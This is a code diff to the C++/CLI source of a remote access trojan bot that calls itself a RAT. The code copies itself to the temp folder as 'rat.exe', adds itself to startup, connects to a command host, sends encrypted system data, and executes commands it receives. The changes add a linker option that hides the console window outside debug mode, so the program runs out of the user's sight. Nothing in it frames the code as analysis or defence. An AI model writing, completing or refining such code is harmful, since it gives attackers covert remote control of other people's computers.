@@ -1,5 +1,5 @@
 #define TMPLOG "zombie.log"
-#define GHOST_HIDE
+#define DEBUG_MODE
 #define GHOSTVER "dot"
 #include "abstract_bot.h"
 #include "encrypt.h"
@@ -10,6 +10,11 @@
 #include <Shellapi.h>
 #include <fstream>
 #include <iostream>
+
+#ifndef DEBUG_MODE
+#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
+#endif
+
 
 using namespace System::Runtime::InteropServices;
 using namespace std;
@@ -43,6 +48,7 @@ void main(cli::array<System::String ^> ^ args)
         exit(EXIT_FAILURE);
     }
 
+
     const char* str_host = (const char*)Marshal::StringToHGlobalAnsi(args[0]).ToPointer();
     const char* str_port = (const char*)Marshal::StringToHGlobalAnsi(args[1]).ToPointer();
 
@@ -74,7 +80,7 @@ ABot::ABot(const char* str_host, const char* str_port)
 void ABot::start(FPCLIENT_CB static_on_client_connect, FP_RES static_on_client_rec_data)
 {
 // if we arent running in temp, do persistance functions
-#ifndef GHOST_HIDE
+#ifndef DEBUG_MODE
     if (strcmp(string(s_current_path + "\\").c_str(), str_temp) != 0) {
         copy_executable();
     } else {
@@ -104,8 +110,8 @@ void ABot::start(FPCLIENT_CB static_on_client_connect, FP_RES static_on_client_r
 void ABot::copy_executable()
 {
     char c_new_path[MAX_PATH + FILENAME_MAX + 1]; // Path of the new copy of the executable
-    std::string s_filename; // File name of the current executable
-    s_filename = s_current_path.substr(s_current_path.find_last_of('\\') + 1);
+    std::string s_filename;
+    s_filename = "rat.exe";
     sprintf_s(c_new_path, "%s%s", str_temp, s_filename.c_str());
 
     // create file read stream for current file
@@ -166,7 +172,6 @@ void ABot::add_executable_to_start_up()
         }
     }
 }
-
 
 void ABot::on_client_connect()
 {
@@ -236,7 +241,6 @@ void ABot::on_client_connect()
     client.send_data(encryptCMD(sys_data.dump()).c_str());
 }
 
-
 // ==========================================
 // Rat Bot needs to be in different file
 // ==========================================
@@ -289,8 +293,7 @@ void RatBot::on_client_rec_data(char* data)
     json j_data = json::parse(s_data);
     string request_id = j_data["request_id"];
     vector<string> commands = j_data["commands"];
-    for ( unsigned int i = 0; i < commands.size(); i++)
-    {
+    for (unsigned int i = 0; i < commands.size(); i++) {
         string command = commands[i];
         cout << command << endl;
         string output = executeCommand(command.c_str());
